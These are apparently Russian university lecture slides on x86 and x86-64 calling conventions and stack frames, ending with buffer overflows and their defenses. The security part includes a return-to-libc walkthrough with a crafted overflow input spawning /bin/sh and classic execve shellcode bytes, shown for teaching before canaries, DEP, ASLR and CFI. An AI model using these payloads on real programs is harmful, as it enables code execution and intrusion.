                   Отказ от указателя фрейма
gcc –S -Os -fomit-frame-pointer -fno-optimize-sibling-calls -masm=intel length.c

                                        length:
                                           sub         esp, 12
                                           xor         eax, eax
                                           mov         edx, dword [esp+16]
                                           test        edx, edx
                                           je          .L2
typedef struct link link;                  mov         ecx, dword [edx+4]
                                           mov         [esp], ecx
struct link {                              call        length
   int payload;                            inc         eax
   link* next;                          .L2:
};                                         add         esp, 12
                                           ret
int length(link *p) {
   return p? length(p->next) + 1 : 0;
}                                                                                   13
                                                                             © 2024 МГУ/ВМК/СП




                   Отказ от указателя фрейма
                                        length:
gcc –S -Os –fno-omit-frame-pointer -fno-optimize-sibling-calls -masm=intel length.c
                                           push        ebp
                                           xor         eax, eax
                                           mov         ebp, esp
                                           sub         esp, 8
                                           mov         edx, dword [ebp+8]
                                           test        edx, edx
                                           je          .L2
typedef struct link link;
                                           mov         ecx, dword [edx+4]
                                           mov         dword [esp], ecx
struct link {
                                           call        length
   int payload;
                                           inc         eax
   link* next;
                                        .L2:
};
                                           leave
                                           ret
int length(link *p) {
   return p? length(p->next) + 1 : 0;
}                                                                                   14
                                                                                   © 2024 МГУ/ВМК/СП



         Какие есть компиляторы и соглашения о
                    вызове функций?
    • Компиляторы                               • Модели памяти
        – LLVM clang (open source)
             • AMD Optimizing C/C++ Compiler         – 16, 32, 64 разряда
               (AOCC)
        – GNU gcc (open source)
        – Microsoft Visual Studio vc
        – Intel icc                             • Операционные системы
                                                  (общего назначения)
    • еще компиляторы …                              – Linux
        – PGI
        – C++Builder (Embarcadero)                   – Windows
        – Oracle Developer Studio                    – macOS (FreeBSD, …)
          последняя стабильная версия –
          2017 год
        – Open Watcom
          последняя версия – 2010 год


Дополнительная техническая информация - домашняя страница Agner Fog:
http://www.agner.org/optimize/ сборник материалов по компиляторам и оптимизации.          15
Calling conventions for different C++ compilers and operating systems
                                                                     © 2024 МГУ/ВМК/СП




                     Соглашение STDCALL
                                       Очистку стека от аргументов вызова
#include <stdio.h>                     выполняет сама вызванная функция
                                  sum:
__attribute__((stdcall))             push     ebp
int sum(int x, int y);               mov      ebp, esp
                                     mov      eax, dword [ebp+12]
int main() {                         add      eax, dword [ebp+8]
   int a = 1, b = 2, c;              pop      ebp
   c = sum(a, b);                    ret      8
   printf("%d\n", c);
   return 0;                      CMAIN:
}                                    ; …
                                     mov      dword [esp+4], 2
__attribute__((stdcall))             mov      dword [esp], 1
int sum(int x, int y) {              call     sum
   int t = x + y;                    sub      esp, 8
   return t;                         mov      dword [ebp-8], eax
}                                    ; …
          При вызове stdcall из функции, имеющей соглашение cdecl,
                                                                            16
          необходим код для компенсации освобождения стека.
                                                                     © 2024 МГУ/ВМК/СП



                                               xorEmAll:
   Соглашение FASTCALL                            test     ecx, ecx
 • Первый и второй параметры размещаются в        mov      eax, edx
   регистрах ECX и EDX                            je       .L6
      • Если размер параметров позволяет          push     ebx
 • Остальные параметры – на стеке, от них стек    mov      ebx, ecx
   очищает вызванная функция, как и в stdcall     sub      esp, 8
 • Такая форма соглашения принята в gcc и MSVC mov         ecx, dword [ecx+4]
                                                  call     xorEmAll
typedef struct chain chain;                       xor      eax, dword [ebx]
                                                  mov      dword [ebx], eax
struct chain {                                    add      esp, 8
     unsigned data;                               pop      ebx
     chain       *next;                         .L6:
};                                                ret
__attribute__((fastcall)) unsigned xorEmAll(chain *p, unsigned salt) {
   if (p) {
      return p->data ^= xorEmAll(p->next, salt);
   } else {
      return salt;
   }                                                              17
}
                                                             © 2024 МГУ/ВМК/СП




                   Параметр – структура
typedef struct {
   short a;
   short b;
   short c;
} t_short;

                                   g:
short g(t_short x, t_short y) {
                                        push    ebp
   return x.a * x.b - x.c + y.a;        mov     ebp, esp
}                                       movzx   eax, word [ebp+10]
                                        imul    ax, word [ebp+8]
                                        sub     ax, word [ebp+12]
                                        add     ax, word [ebp+16]
                                        pop     ebp
                                        ret


                                                                    18
                                                            © 2024 МГУ/ВМК/СП




        Возвращаемое значение - структура
                                        init_t:
typedef unsigned short uint16;             push ebp
                                           mov epb, esp
typedef struct {                           mov eax, [ebp+8]
   uint16 i;                               mov [eax],    word 0xBADB
                                           mov [eax+2], word 0xADBA
   uint16 j;
                                           mov [eax+4], word 0xDBAD
   uint16 k;                               leave
} triple;                                  ret 4
                                              h:
triple init_t() {                                push ebp
  return (triple){0xBADB, 0xADBA, 0xDBAD};       mov ebp, esp
                                                 sub esp, 24
}
                                                 lea eax, [ebp-6]
                                                 mov [esp], eax
void h() {                                       call init_t
   volatile triple t = init_t();              ; компенсация
}                                             ; освобождения стека
                                                 leave
                                                                 19
                                                 ret
                                                         © 2024 МГУ/ВМК/СП




       Возвращаемое значение - структура

typedef struct {                     f:
  int x;                                  ???
  int y;                             f2:
  int z;                                ???
} triple32;

triple32 f2(int a, int b, int c) {   1. Реализуем f
   triple32 v = {a-b, b-c, c-a};         1. Распределяем
   return v;                                память во фрейме
                                         2. Вычисляем
}                                           значения
                                            аргументов вызова
void f(triple32 *p) {                    3. Вызываем f2
   *p = f2(1, 2, 3);                 2. Реализуем f2
}
                                                                20
                                                            © 2024 МГУ/ВМК/СП



      Зачем переходить на 64-х разрядную
                 архитектуру?
• Особенности полноценной 64-х разрядной процессорной
  архитектуры
   – АЛУ оперирует 64-х разрядными данными
   – (Большой) набор 64-х разрядных регистров общего назначения
   – 64-х разрядное (плоское) адресное пространство
• Преимущества 64-х разрядной процессорной архитектуры
   – Эффективнее (быстрее) работаем с 64-х разрядными данными
   – Реже «проливаем» содержимое регистров
   – Огромное пространство адресуемой памяти
     264 = 16230230= 16 Эксбибайт
• Примеры полноценных 64-х разрядных архитектур
   – PowerPC, Sparc, Alpha, IA-64 (Itanium)


                                                                   27
                                                                                                    © 2024 МГУ/ВМК/СП




                   Что такое «Архитектура x86_64»?

    • В момент появления x86_64 едва ли возможно отнести к
      полноценным 64-x разрядным архитектурам
          – Архитектура x86_64 была получена очередным эволюционным расширением
            ISA IA-32
          – Двоичная кодировка команд IA-32 не изменилась. Работа с 64-х разрядными
            регистрами и данными реализована через специальные префиксы в коде
            операции, переопределяющие поведение процессора по умолчанию.
            Декодирование команд «оптимизировано» для работы с 32-х разрядными
            командами
          – Доступ к 64-х разрядному адресному пространству реализован через
            доработанный механизм сегментной памяти IA-32
    • Почему AMD/Intel пошли таким путем?
          – Некоторые свойства 64-х разрядных процессоров достигаются, причем
            переход с 32-х разрядных процессоров получается проще
          – Сохранена работоспособность ISA IA-32, а следовательно – всех раннее
            написанных для данной архитектуры программ.
The move toward 64-bit computing for mainstream applications, will initially focus on applications that
are already constrained by 32-bit memory limitations. … Platforms based on the Intel Xeon processor
with Intel EM64T are preferable for general purpose applications, such as Web and mail infrastructure,
digital content creation, mechanical computer aided design, and electronic design automation; and for
mixed environments in which optimized 32-bit performance remains critical.                                 28
Intel. The 64-bit Tipping Point. September 2004 https://software.intel.com/sites/default/files/e1/4f/26944
                                               © 2024 МГУ/ВМК/СП




                          Архитектура x86-64

• Адресуемая память 264 байт
  (на самом деле - нет)
• Вдвое больше регистров общего
  назначения, размер регистров
  удвоился
• Векторные регистры и команды SSE
• Обращение к данным через
  смещение относительно счетчика
  команд
• Величины 264 кодируются только в
  команде MOV
   • Переслать непосредственно
     закодированный операнд можно только в
     регистр
   • В общем формате адресного кода
     операнда-памяти смещение осталось 232
     Можно задать абсолютный адрес 264, но
     только если это пересылка данных из RAX          29
                                                                                      © 2024 МГУ/ВМК/СП



            Соглашение вызова в x86-64: порядок
               использования регистров (1/2)
       rax       Возвращаемое значение               r8                     Аргумент #5

                      Сохраняется вызванной                                 Аргумент #6
       rbx            функцией
                                                     r9
                                                                   Сохраняется
       rcx                     Аргумент #4           r10           вызывающей функцией
                                                                   Сохраняется
       rdx                     Аргумент #3           r11           вызывающей функцией
                                                                   Сохраняется вызванной
       rsi                     Аргумент #2           r12           функцией

                               Аргумент #1                         Сохраняется вызванной
       rdi                                           r13           функцией

                           Указатель стека                         Сохраняется вызванной
       rsp                                           r14           функцией
                     Сохраняется вызванной                         Сохраняется вызванной
       rbp           функцией
                                                     r15           функцией
                                                                                             30
Единое соглашение для Linux, BSD, OS X, Solaris и компиляторов gcc и icc.
                                                              © 2024 МГУ/ВМК/СП



     Соглашение вызова в x86-64: порядок
        использования регистров (2/2)
• Аргументы передаются в функцию через регистры
   – Если целочисленных параметров более 6, остальные передаются
     через стек
   – Регистры-аргументы могут рассматриваться как сохраненные на
     стороне вызывающей функции

• Все обращения к фрейму организованы через указатель стека
   – Отпадает необходимость поддерживать значения EBP/RBP

• Остальные регистры
   – 6 регистров сохраняется вызванной функцией
   – 2 регистра сохраняется вызывающей функцией
   – 1 регистр для возвращаемого значения
     может рассматриваться как регистр, сохраненный на стороне
     вызывающей функции
   – 1 выделенный регистр – указатель стека
                                                                     31
                                                                © 2024 МГУ/ВМК/СП




  Обмен значениями переменных long@x86-64
void swap_l(long *xp, long *yp) {     swap:
  long t0 = *xp;                         mov    rdx,   qword [rdi]
  long t1 = *yp;                         mov    rax,   qword [rsi]
  *xp = t1;                              mov    qword [rdi],   rax
  *yp = t0;                              mov    qword [rsi],   rdx
}                                        ret


• Параметры передаются через регистры
   – Первый параметр (xp) был размещен в rdi,        адрес
                                                                rsp
     второй (yp) – в rsi                            возврата
   – 64-разрядные указатели                                      Фрейм не
• Никакие команды не работают со стеком (за                      создается
  исключением ret)
• Удалось полностью отказаться от
  использования стека
   – Все локальные данные размещены на регистрах
                                                                       32
                                                                        © 2024 МГУ/ВМК/СП




     Локальные переменные в «красной зоне»
                   Листовая функция
 /*                                      swap_a:
  * Обмен через локальный массив           mov rax, qword [rdi]
  */                                       mov qword [rsp-24], rax
 void swap_a(long *xp, long *yp) {         mov rax, qword [rsi]
     volatile long loc[2];                 mov qword [rsp-16], rax
     loc[0] = *xp;                         mov rax, qword [rsp-16]
     loc[1] = *yp;                         mov qword [rdi], rax
     *xp = loc[1];                         mov rax, qword [rsp-24]
     *yp = loc[0];                         mov qword [rsi], rax
 }                                         ret

• Обходимся без изменения указателя стека
   – Все данные размещены во «фрейме», неявно
     организованным под текущим указателем             адрес возврата            rsp
     стека                                       −8 не используется
   – Поддержка «красной зоны» явно прописана в
     ABI x86_64: обработка прерываний не         −16      loc[1]
     должна затрагивать содержимое «красной      −24      loc[0]
     зоны»                                                                     33
                                                                                                           © 2024 МГУ/ВМК/СП




    Нелистовая функция без организации фрейма
                                                                • На период работы swap уже никаких
                                                                  значений сохранять на регистрах не
  /* Обмен a[i] и a[i+1] */                                       требуется
  void swap_ele(long a[], int i) {                              • Не требуется сохранять регистры в
      swap(&a[i], &a[i+1]);                                       качестве вызванной функции
  }                                                             • Команда (префикс) rep используется
                                                                  вместо команды NOP
                                                                      – Рекомендации компании AMD…
Источники:
Software Optimization Guide for AMD64 Processors
https://support.amd.com/TechDocs/25112.PDF раздел 6.2
Software Optimization Guide for AMD Family 17h Processors
https://developer.amd.com/wordpress/media/2013/12/55723_SOG_Fam_17h_Processors_3.00.pdf раздел 2.8.1.3.2

  swap_ele:
     movsx rsi, esi                                             ; знаковое расширение i
     lea   rax, [rdi + 8*rsi + 8]                               ; &a[i+1]
     lea   rdi, [rdi + 8*rsi]                                   ; &a[i] первый аргумент
     mov   rsi, rax                                             ;       второй аргумент
     call swap
     rep                                                        ; пустая команда / НОП
     ret                                                                                                          34
             © 2024 МГУ/ВМК/СП




Лекция 0xC


 27 марта
                                                                            © 2024 МГУ/ВМК/СП




              Пример организации фрейма
long sum = 0;                           swap_ele_su:
/* Swap a[i] & a[i+1] */                   mov   [rsp-16], rbx
void swap_ele_su                           mov   [rsp-8], rbp
  (long a[], int i) {                      sub   rsp, 16
    swap(&a[i], &a[i+1]);                  movsx rax, esi
    sum += (a[i]*a[i+1]);                  lea   rbx, [rdi + 8*rax + 8]
}                                          lea   rbp, [rdi + 8*rax]
                                           mov   rsi, rbx
                                           mov   rdi, rbp
• Размещаем значения                       call swap
  выражений &a[i] и &a[i+1]                mov   rax, [rbx]
                                           imul rax, [rbp]
  в регистрах, сохраняемых на
                                           add   [rel sum], rax
  стороне вызванной функции                mov   rbx, [rsp]
• Необходимо сформировать                  mov   rbp, [rsp+8]
  фрейм для сохранения этих                add   rsp, 16
  регистров                                ret
              Для x86-64 может использоваться одна из четырех моделей построения кода
                                                                                   2
                         -mcmodel=[small | medium | large | kernel]
                                                             © 2024 МГУ/ВМК/СП




          Как происходит работа с фреймом

swap_ele_su:
   mov   [rsp-16], rbx          ; сохраняем rbx
   mov   [rsp-8], rbp           ; сохраняем rbp
   sub   rsp, 16                ; выделяем на стеке место для фрейма
   movsx rax, esi               ; знаковое расширение i
   lea   rbx, [rdi + 8*rax + 8] ; &a[i+1]
   lea   rbp, [rdi + 8*rax]     ; &a[i]
   mov   rsi, rbx               ; второй аргумент вызова
   mov   rdi, rbp               ; первый аргумент вызова
   call swap
   mov   rax, [rbx]             ; помещаем в rax a[i+1]
   imul rax, [rbp]              ; умножаем на a[i]
   add   [rel sum], rax         ; прибавляем к переменной sum
                                ; адрес вычисляется как RIP + sum
   mov   rbx, [rsp]             ; восстанавливаем значение rbx
   mov   rbp, [rsp+8]           ; восстанавливаем значение rbp
   add   rsp, 16                ; освобождаем место занятое фреймом
   ret                                                            3
                                                   © 2024 МГУ/ВМК/СП




       Особенности работы с фреймом

• Выделение всего фрейма одной командой
  – Обращения к содержимому фрейма используют
    адресацию относительно rsp
  – Уменьшаем значение в указателе стека
  – Выделение памяти может выполняться не сразу,
    поскольку в определенных временных пределах
    хранить данные в «красной зоне» безопасно
• Простое освобождение фрейма
  – Увеличиваем значение в указателе стека
  – Указатель фрейма не требуется

                                                           4
                                                       © 2024 МГУ/ВМК/СП



            Промежуточные итоги
     x86-64 : организация вызова функций
• Активное использование регистров
  – Передача параметров
  – Больше регистров – больше возможностей вычислять
    временные значения и их повторно использовать

• Минимальное использование стека
  – Иногда удается вообще его не использовать
  – Создание/освобождение всего фрейма

• Доступные оптимизации
  – В каком виде будет создан фрейм?
  – Как именно будет выполняться создание?

                                                               5
                                                                  © 2024 МГУ/ВМК/СП




                                         Далее…

•   Функции
     –   Соглашение CDECL, рекурсия
     –   Что происходит в Си-программе до и после функции main
     –   Выравнивание стека, использование библиотечных функций
     –   Различные соглашения о вызове функций
          • cdecl/stdcall/fastcall, отказ от указателя фрейма
          • Гибридное соглашение
     –   Переменное число параметров
     –   Ассемблерные вставки
•   Архитектура x86-64
     –   Особенности
     –   Модель памяти
     –   Соглашение вызова функций
•   Безопасность программного обеспечения
     –   Переполнение буфера и эксплуатация ошибок
     –   Механизмы защиты
          • Компиляторные
          • Со стороны ОС
          • Со стороны аппаратуры
•   Организация динамической памяти
•   Числа с плавающей точкой                                              6
                                                                                    © 2024 МГУ/ВМК/СП




         Пример №1 «Заглянуть за горизонт»
void f(int i) {                    f:
   int a[3] = {1, 2, 3};                push       ebp
   printf("%x\n", a[i]);                mov        ebp, esp
                                        sub        esp, 32
}
                                        mov        eax, dword [ebp+8]
  i Вывод на                            mov        dword [ebp-20], 1
      экран                             mov        dword [ebp-16], 2
  0         1                           mov        dword [ebp-12], 3
                                        push       dword [ebp-20+eax*4]
  1         2      массив a             push       .LC1
  2         3                           call       printf
  3   f7ebf4a0                          add        esp, 16
                   «мусор»
  4   f7ed7f10                          leave
  5   ff9958d8   сохраненный ebp        ret
  6   804907b    адрес возврата          student@pc:~/asm$ gcc -v
                                         …
  7         7    фактический аргумент    gcc version 11.3.0 (Ubuntu 11.3.0-1ubuntu1~22.04)
                                         student@pc:~/asm$ gcc -o horizon
                                         -D_FORTIFY_SOURCE=0 -fno-stack-protector
  8   f7ebf66c     содержимое фрейма     -fcf-protection=none -fno-omit-frame-pointer -m32
                                         -Os –no-pie -fno-PIC -masm=intel
                                                                                             7
  9   f7ebfb10     вызывающей функции    -fno-asynchronous-unwind-tables horizon.c
                                                                                                               © 2024 МГУ/ВМК/СП
#include <stdio.h>       Пример №2 «Нескучная арифметика»                             arith: arith.c
                                                                                              gcc -o arith -D_FORTIFY_SOURCE=0
                                                                                      -fno-stack-protector -fcf-protection=none
void f() {                                          f:                                -fno-omit-frame-pointer -m32 -O0 -fno-PIC
                                                                                      -no-pie -masm=intel
   char buf[5];                              push       ebp                           -fno-asynchronous-unwind-tables arith.c

   int *ptr;                                 mov        ebp, esp        arith.s: arith.c
                                                                                gcc -S -D_FORTIFY_SOURCE=0
                                             sub        esp, 16         -fno-stack-protector -fcf-protection=none

   ptr = (int*)(buf + 20);                   lea        eax, [ebp-9] -fno-omit-frame-pointer    -m32 -O0 -fno-PIC
                                                                        -masm=intel -fno-asynchronous-unwind-tables
                                                                        arith.c
   (*ptr) += 23;                             add        eax, 20
}                                            mov        dword [ebp-4], eax
                                             mov        eax, dword [ebp-4]
void main() {                                mov        eax, dword [eax]
  int x = 1;                                 lea        edx, [eax+23]
                                             mov        eax, dword [ebp-4]
  f();                                       mov        dword [eax], edx
                             gcc 11.3.0
  x += 1;                                    leave
  printf("1 + 1 = %d\n", x);                 ret
}                             • Можно менять константы в функции f (выделены красным)
08048439 <main>:              • Как добиться того, чтоб программа напечатала «1», а не «2»?
 ...                          • Есть, как минимум, два способа
 804844f:            55                             push      ebp
 8048450:            89 e5                          mov       ebp,esp
 8048452:            51                             push      ecx
 8048453:            83 ec 14                       sub       esp,0x14
 8048456:            c7 45 f4 01 00 00 00           mov       DWORD PTR [ebp-0xc],0x1
 804845d:            e8 c4 ff ff ff                 call      8048426 <f>
 8048462:            83 45 f4 01                    add       DWORD PTR [ebp-0xc],0x1
 8048466:            83 ec 08                       sub       esp,0x8
 8048469:            ff 75 f4                       push      DWORD PTR [ebp-0xc]
 804846c:            68 10 85 04 08                 push      0x8048510
 8048471:            e8 6a fe ff ff                 call      80482e0 <printf@plt>                                        8
 ...
                                                                         © 2024 МГУ/ВМК/СП




                 Пример № 3 «return-to-libc»
   • Как можно заставить программу выполнять произвольные
     действия?
   • Если из-за некоторой ошибки в коде
     удается переписать адрес возврата, #include <stdio.h>
     то можно передать управление на #include <string.h>
     произвольный адрес                 #include <stdlib.h>

   • До каких пределов можно            void f(FILE* fd) {
     расширить доступный                   char buf[16];
     функционал программы?                 fgets(buf, 256, fd);
                                           puts(buf);
       – Превращаем ее в командный             }
         интерпретатор (шелл)
       – Можем делать все, что система         int main(int argc, char* argv[]) {
          разрешает пользователю                  FILE *fd = fopen(argv[1], "rb");
         (владельцу программы)                    f(fd);
                                                  fclose(fd);
#include <stdlib.h>                               system("sleep 1");
                                                  return 0;
int system(const char *string);
                                               }

system() выполняет команды, указанные в string, вызывая в свою очередь           9
команду /bin/sh -c string, и возвращается, когда команда выполнена.
                                                                        © 2024 МГУ/ВМК/СП




     Определяем устройство фрейма функции f
...
(gdb) set disassembly-flavor intel              • Восстанавливаем, как устроен
(gdb) disassemble f                               фрейм функции: где размещен
Dump of assembler code for function f:            буфер, где адрес возврата, какое
=> 0x08048900 <+0>:      push   ebx               между ними расстояние.
   0x08048901 <+1>:      sub    esp,0x1c
   0x08048904 <+4>:      push   DWORD PTR [esp+0x24]
   0x08048908 <+8>:      push   0x100
   0x0804890d <+13>:     lea    ebx,[esp+0xc]
   0x08048911 <+17>:     push   ebx
   0x08048912 <+18>:     call   0x80504f0 <fgets>
   0x08048917 <+23>:     mov    DWORD PTR [esp],ebx
   0x0804891a <+26>:     call   0x80509a0 <puts>
   0x0804891f <+31>:     add    esp,0x28
   0x08048922 <+34>:     pop    ebx
   0x08048923 <+35>:     ret             void f(FILE* fd) {
End of assembler dump.
                                             char buf[16];
(gdb)
                                               fgets(buf, 256, fd);
                                               puts(buf);
                                                                               10
                                           }
                                                                       © 2024 МГУ/ВМК/СП



                   Определяем адреса и
                формируем входные данные
student@pc:~/samples/2018$ nm ret2libc | grep ' system$'
0804fb50 W system
student@pc:~/samples/2018$ ./gdb.cmd benign_input.data
...
Reading symbols from /home/student/samples/2018/ret2libc...(no debugging
symbols found)...done.
(gdb) br f
Breakpoint 1 at 0x8048900
(gdb) run
Starting program: /home/student/samples/2018/ret2libc input.txt

Breakpoint 1, 0x08048900 in f ()
(gdb) info register esp
esp            0xffffddbc        0xffffddbc

                      • Определяем адрес, куда будет передаваться управление
                          • 0x0804fb50
                      • Определяем адреса данных, размещенных на стеке
                          • 0xffffddc8
  28 байт
                                                                              11
“AAA…AA\x50\xfb\x04\x08BBBB\xc8\xdd\xff\xff/bin/sh\x00”
                                                                             © 2024 МГУ/ВМК/СП




                     Эксплуатация ошибок
• В рассмотренном примере для перехвата управления и выполнения
  произвольного кода использовалась ошибка переполнения буфера
   • Был построен Эксплойт – входные данные, приводящие к эксплуатации
     уязвимости (ошибки)
   • Атака «return-to-libc», впервые продемонстрирована
     Александром Песляком (aka Solar Designer) в 1997 году
• Последствия срабатывания ошибок
  (с точки зрения Информационной Безопасности)
   • Аварийное завершение работы
   • Порча обрабатываемых данных
   • Несанкционированный доступ к данным
• Наихудшая ситуация – в программе выполняется произвольный код
• В более ранних работах атакующий внедрял исполняемый код
  непосредственно во входные данные, переполняющие буфер.
   • Измененный адрес возврата передает управление внутрь входных данных, в то
     место, где размещен код.
   • Архитектура фон Неймана не различает код и данные
   • Elias Levy. Smashing The Stack For Fun And Profit. Phrack 49, November 08, 1996
                                                                                    12
             © 2024 МГУ/ВМК/СП




Лекция 0xD


 30 марта
                                                                                                © 2024 МГУ/ВМК/СП



          Ошибки в программах – основной источник
           уязвимостей ПО. Как можно защититься?!
                                                     Проведение регулярного анализа ПО во время разработки
Не существует «серебряной                            Требования к стилю кодирования
                                                     Обучение сотрудников
пули», т.е. одной единственной                       Системы сертификации ПО
                                                     Баунти-программы
технологии, которая бы способна                      …

обезопасить программы от всех
угроз                                                   Организационные меры

  Инструменты статического и                     Технологии и инструменты разработки
динамического анализа программ
                                                           безопасного ПО
 Интерпретируемые языки
  программирования (?)                                         Компилятор
Анализ во время компиляции
                                                     Операционная система
 Санитайзеры
                   CFI
                                                              Система команд
Виртуальная память,
ограничения доступа                                 Аппаратура: процессор, память,
                                                       устройства ввода-вывода
Контроль целостности кода
  и данных, шифрование
                             Режим доверенного                                                           2
                                выполнения
                                                              © 2024 МГУ/ВМК/СП



                        Способы защиты:
                       канарейка на стеке
#include <stdio.h>
#include <string.h>

int my_bad_function(char* d_msg)
{
    char what[100];
    strcpy(what, d_msg);
    printf("%s\n", what);             ...       ; пролог
}                                     mov    eax, dword [gs:20]
                                      mov    dword [ebp-12], eax
                                      xor    eax, eax
В актуальных версиях                  ...       ; тело функции
компилятора gcc проверка              mov    edx, dword [ebp-12]
включена по-умолчанию.                xor    edx, dword [gs:20]
Отключается опцией                    je     .L3
-fno-stack-protector                  call   __stack_chk_fail
                                   .L3:
                                                                      3
                                      ...       ; эпилог
                                                                                            © 2024 МГУ/ВМК/СП



    Машина фон Неймана. Принцип 2. Неразличимость
jmp 0x1f   # 2 bytes
                                  команд и данных
pop    esi             # 1 byte
mov    [esi+0x8], esi, # 3 bytes                     • Запустить командный интерпретатор
xor    eax,eax         # 2 bytes
mov    [esi+0x7], al   # 3 bytes                        можно и без функции system
mov    [esi+0xc], eax # 3 bytes                      • Воспользуемся механизмом
mov    al,0xb          # 2 bytes
mov    ebx,esi         # 2 bytes                        непосредственного вызова функций
lea    ecx,[esi+0x8]   # 3 bytes                        ОС – системными вызовами
lea    edx, [esi+0xc] # 3 bytes
int    0x80            # 2 bytes                     • Данные могут интерпретироваться
xor    ebx,ebx         # 2 bytes                        как команды процессора!
mov    eax,ebx         # 2 bytes
inc    eax             # 1 bytes
int    0x80            # 2 bytes
call   -0x24           # 5 bytes
db     "/bin/sh"       # 8 bytes
                       # 46 bytes total
                                 char buffer[] =
                                    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
                                    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
                                    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

                                typedef void (* func)(void);

                                int main(int argc, char** argv) {
                                   func f = (func) buffer;
                                   f();
                                   return 0;                                                        4
                                }
                                                                                           © 2024 МГУ/ВМК/СП




         Предотвращение выполнения данных
                                                               char buffer[] = {...};

•   Машина фон Неймана не различает                            typedef void (* func)(void);
    код и данные
                                                               int main(int argc, char** argv) {
     –   Поступившие извне данные можно воспринимать
                                                                  func f = (func) buffer;
         как исполняемый код, достаточно передать
                                                                  f();
         на них управление!
                                                                  return 0;
     –   Гарвардская архитектура в принципе                    }
         не имеет такой уязвимости
•   DEP – Data Execution Prevention, технология реализуется доработкой как
    аппаратуры, так и операционной системы
     –   В аппаратуре была добавлена возможность размечать память как недоступную для
         выполнения
          • Все время до этого был только один бит разметки – запрещающий запись
          • Разработка примерно 2000 года, AMD и Intel вывели на рынок под разными маркетинговыми
            названиями (NX bit и XD bit соответственно)
     –   Операционная система при подготовке пользовательской программы к запуску
         размечает память стека и статических данных, как недоступную для выполнения (W^X –
         нельзя одновременно записывать и исполнять)
     –   Попытка передать на такую память управление сразу приводит к аварийному
         завершению
     –   Поддержана в Linux и Windows спустя 4 года – в 2004 году
•   Некоторые программы требуют возможность размещать и выполнять код на
    стеке (JIT, just-in-time компиляция)
                                                                                                    5
                                                                                                           © 2024 МГУ/ВМК/СП



                  Рандомизация (карты) адресного
                          пространства
     •   ASLR – Address Space Layout Randomization
     •   Размещение основных компонент программы в памяти компьютера на случайных базовых
         адресах
          –   Код, динамические библиотеки, статические данные, куча, стек
     •   Атака «return-to-libc» перестает работать, становится гораздо трудней определить, где
         размещена функция system
     •   ASLR реализуется операционной системой
Адреса
                                                                                         Стек
              Стек
                                                     Стек

                                                                                         Куча
               Куча                                   Куча                           Статические
           Статические                            Статические                          данные
             данные                                 данные

              Код                                    Код
                                                                                         Код


                                                                                                                   6
                     Следующий запуск программы                 Следующий запуск программы         Время
                                                                                            © 2024 МГУ/ВМК/СП




    Контроль целостности потока управления

•   CFI – Control Flow Integrity
•   Проверка того, что управление передается туда, «куда надо»
     –   Условные переходы – только относительная адресация, переход (смещение в коде)
         задается константой в теле команды
     –   Безусловные переходы – операндом может выступать не только константа, но и регистр
         и ячейка памяти
     –   Вызов функции – аналогично безусловным переходам
     –   Возврат из функции определяется адресом возврата на стеке
•   Проблема: указатель на функцию или адрес возврата может быть
    целенаправленно изменен эксплуатацией программного дефекта
•   Intel CET (Control-flow Enforcement Technology), анонсировано в 2016, первое
    появление – 2020 (Tiger Lake)
     –   Контроль косвенной адресации
          • В набор команд добавлена команда ENDBR (ENDBR64/ENDBR32)
          • Все цели косвенной передачи управления должны начинаться с команды ENDBR
          • Если управление с косвенной адресацией было передано не на ENDBR – аварийная остановка
     –   Контроль адресов возврата
          • В памяти создается теневой стек – копии адресов возврата
          • Если при выполнении команды RET содержимое стеков не совпадает – аварийная остановка
     –   CET можно включать/выключать, исполняемые файлы с CET должны иметь пометку

                                                                                                     7
                                                                             © 2024 МГУ/ВМК/СП



                                WYSINWYX:
                    What You See Is Not What You eXecute




                                              memset(password, ’\0’, len);
                                              free(password);




Gogul Balakrishnan and Thomas Reps. 2010. WYSINWYX: What you see is
not what you eXecute. ACM Trans. Program. Lang. Syst. 32, 6, Article 23              8
(August 2010), 84 pages. https://doi.org/10.1145/1749608.1749612
                                                                                                                     © 2024 МГУ/ВМК/СП




                 Безопасный компилятор (1/2)
                                                Xi Wang, Haogang Chen, Alvin Cheung, Zhihao Jia, Nickolai Zeldovich, M. Frans Kaashoek.
                                                Undefined Behavior: What Happened to My Code?
                                                APSys ’12, July 23–24, 2012, Seoul, S. Korea
• Безопасный компилятор
     – Уязвимости в программе могут появляться не только из-за ошибок в ее коде, но и в
       результате оптимизаций, выполняемых компилятором.
       Причина – неопределенное или реализационно зависимое поведение,
       совмещенное с оптимизациями
     – Требования доверия
          •   Безопасные оптимизации: нельзя опираться на предположения об априорной «корректности»
              программы
          •   Например, значения указателей различающихся типов могут совпадать, могут происходить
              целочисленные переполнения, …
          •   Принудительная инициализация всех переменных
          •   Предупреждение (ошибка компиляции) при обнаружении в коде неопределенных ситуаций
          •   Обязательная активация всех штатных механизмов защиты
     – Необходимо сохранять приемлемую производительность

char *buf = ...;
char *buf_end = ...;
unsigned int len = ...;
if (buf + len >= buf_end)
   return;
/* len слишком большое */
if (buf + len < buf)
   return;
/* переполнение при вычислении buf+len и выход за границы массива*/
/* запись в массив buf */
                                                                                                                                9
                                                                                                         © 2024 МГУ/ВМК/СП




                   Безопасный компилятор (2/2)

•   Диверсифицирующая сборка
     –   На каждом запуске компилятора случайным образом меняется размещение переменных на
         стеке, меняется порядок следования функций
     –   Если для одного экземпляра программы атакующему удастся построить эксплойт,
         на другом экземпляре эксплойт не будет работать
•   «Безопасное» размещение переменных во фрейме
     –   Если во фрейме разместить указатели ниже массивов, исчезает опасность, что их
         целенаправленно модифицируют при переполнении буфера на стеке
           •   Остается потенциальная опасность, что атакующему удастся выйти за нижнюю границу буфера
               (buffer underflow)
•   Безопасные библиотеки
     errno_t strcpy_s( char *strDestination,
                           size_t numberOfElements,
                           const char *strSource );
    Могут использоваться как явно, так и неявно, когда компилятор
    сам определит размеры принимающего буфера памяти и
    заменит вызываемую функцию на более безопасную
•   ГОСТ Р «Защита информации. Разработка безопасного
    программного обеспечения. Безопасный компилятор
    языков С/С++. Общие требования»
     –   Вступает в действие с 1 апреля 2024 года


                                                                                                                10
                                                           © 2024 МГУ/ВМК/СП




  _chk-версии некоторых стандартных функций

void f(int i) {            f:
   int a[3] = {1, 2, 3};        push    ebp
   printf("%x\n", a[i]);        mov     ebp, esp
                                sub     esp, 40
}    i  Вывод на экран          mov     eax, dword [ebp+8]
